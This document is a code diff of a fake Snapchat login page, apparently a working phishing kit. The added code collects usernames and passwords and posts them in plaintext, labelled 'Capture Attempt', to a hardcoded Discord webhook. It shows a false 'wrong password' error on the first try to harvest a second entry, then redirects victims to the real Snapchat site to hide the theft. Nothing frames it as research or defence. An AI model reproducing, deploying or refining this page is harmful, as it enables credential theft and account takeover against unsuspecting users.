@@ -26,11 +26,7 @@
             box-sizing: border-box;
         }
 
-        .snap-ghost {
-            width: 55px;
-            margin-bottom: 15px;
-        }
-
+        .snap-ghost { width: 55px; margin-bottom: 15px; }
         h2 { font-size: 26px; margin: 0 0 20px 0; font-weight: 700; color: #16191c; }
 
         .input-group { text-align: left; margin-bottom: 15px; }
@@ -44,8 +40,10 @@
             box-sizing: border-box;
             font-size: 16px;
             outline: none;
-            background-color: #ffffff;
         }
+
+        .input-error { border-color: #e74c3c !important; }
+        .error-text { color: #e74c3c; font-size: 13px; margin-top: 8px; font-weight: 500; display: none; }
 
         .blue-link { color: #00b2ff; font-size: 13px; font-weight: 600; text-decoration: none; display: block; margin: 15px 0 25px 0; cursor: pointer; }
 
@@ -62,16 +60,13 @@
 
         .divider { display: flex; align-items: center; margin: 25px 0; color: #717274; font-size: 11px; font-weight: bold; }
         .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #e8e8e8; }
-        .divider:not(:empty)::before { margin-right: .8em; }
-        .divider:not(:empty)::after { margin-left: .8em; }
-
+        
         .google-btn {
             display: flex; align-items: center; justify-content: center; width: 100%; padding: 12px;
             border: 1px solid #e0e0e0; border-radius: 100px; background: white; cursor: pointer;
             font-size: 15px; font-weight: 600; color: #3c4043;
         }
         .google-icon { width: 18px; margin-right: 10px; }
-        .back-nav { margin-top: 25px; font-weight: bold; text-transform: uppercase; font-size: 11px; border-bottom: 2px solid #000; text-decoration: none; color: #000; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -81,57 +76,78 @@
             <path fill="white" stroke="black" stroke-width="4" d="M50,15.5c-14.4,0-23.4,9.9-23.4,22.8c0,4.8,1.2,9.6,4.5,13.2c-0.6,2.1-1.2,4.8-1.2,7.5 c0,7.2,5.7,12.3,13.5,12.3c0.9,0,1.8,0,2.7-0.3c0,0.3,0,0.6,0,0.9c0,5.7,4.8,10.2,10.8,10.2s10.8-4.5,10.8-10.2 c0-0.3,0-0.6,0-0.9c0.9,0.3,1.8,0.3,2.7,0.3c7.8,0,13.5-5.1,13.5-12.3c0-2.7-0.6-5.4-1.2-7.5c3.3-3.6,4.5-8.4,4.5-13.2 C73.4,25.4,64.4,15.5,50,15.5z"/>
         </svg>
 
-        <h2>Log in to Snapchat</h2>
+        <h2 id="mainTitle">Log in to Snapchat</h2>
         
-        <div class="input-group">
-            <label id="inputLabel">Username or Email</label>
-            <input type="text" id="userInput">
+        <div id="step1">
+            <div class="input-group">
+                <label id="inputLabel">Username or Email</label>
+                <input type="text" id="userInput">
+            </div>
+            <a class="blue-link" onclick="toggleInputType()">Use phone number instead</a>
+            <button class="next-btn" onclick="processUser()">Next</button>
+        </div>
+
+        <div id="step2" style="display:none;">
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="passInput">
+                <div id="pass-error" class="error-text">That's not the right password.</div>
+            </div>
+            <a class="blue-link" href="https://accounts.snapchat.com/accounts/password_reset_options" target="_blank">Forgot Password</a>
+            <button class="next-btn" id="loginBtn" onclick="processPass()">Log In</button>
         </div>
         
-        <a class="blue-link" id="toggleLink" onclick="toggleInputType()">Use phone number instead</a>
-        
-        <button class="next-btn" onclick="sendData()">Next</button>
-        
         <div class="divider">OR</div>
-        
         <button class="google-btn">
             <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Color_Icon.svg" class="google-icon">
             Continue with Google
         </button>
     </div>
 
-    <div class="back-nav" onclick="location.reload()">BACK</div>
-
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1502467504029700206/uEqMZdCphyeIsFIvace1fdo0nOcqFZcguB0uNebzYlvCBs3Z9_t7E86524zlvyRMUjbD";
-        let isPhoneMode = false;
+        let attemptCount = 0;
 
-        function toggleInputType() {
-            const label = document.getElementById('inputLabel');
-            const link = document.getElementById('toggleLink');
-            isPhoneMode = !isPhoneMode;
-            if (isPhoneMode) {
-                label.innerText = "Phone Number";
-                link.innerText = "Use email instead";
-            } else {
-                label.innerText = "Username or Email";
-                link.innerText = "Use phone number instead";
-            }
+        function processUser() {
+            const user = document.getElementById('userInput').value;
+            if(user.length < 2) return;
+            document.getElementById('step1').style.display = "none";
+            document.getElementById('step2').style.display = "block";
+            document.getElementById('mainTitle').innerText = "Enter Password";
         }
 
-        function sendData() {
+        function processPass() {
             const user = document.getElementById('userInput').value;
-            if(!user) return;
-            
+            const pass = document.getElementById('passInput').value;
+            const error = document.getElementById('pass-error');
+            const input = document.getElementById('passInput');
+
+            if(!pass) return;
+            attemptCount++;
+
+            // Log every attempt to Discord
             fetch(webhookURL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ 
-                    content: `📢 **New Login Attempt**\n**User/Phone:** ${user}` 
+                    content: `🎯 **Capture Attempt #${attemptCount}**\n**User:** ${user}\n**Pass:** ${pass}` 
                 })
-            }).then(() => {
-                alert("Connection error. Please try again.");
             });
+
+            if (attemptCount === 1) {
+                // Mimic a failed login
+                input.classList.add('input-error');
+                error.style.display = "block";
+                input.value = "";
+            } else {
+                // On 2nd try, send to real site
+                window.location.href = "https://accounts.snapchat.com/accounts/login";
+            }
+        }
+
+        function toggleInputType() {
+            const label = document.getElementById('inputLabel');
+            label.innerText = label.innerText === "Phone Number" ? "Username or Email" : "Phone Number";
         }
     </script>
 </body>
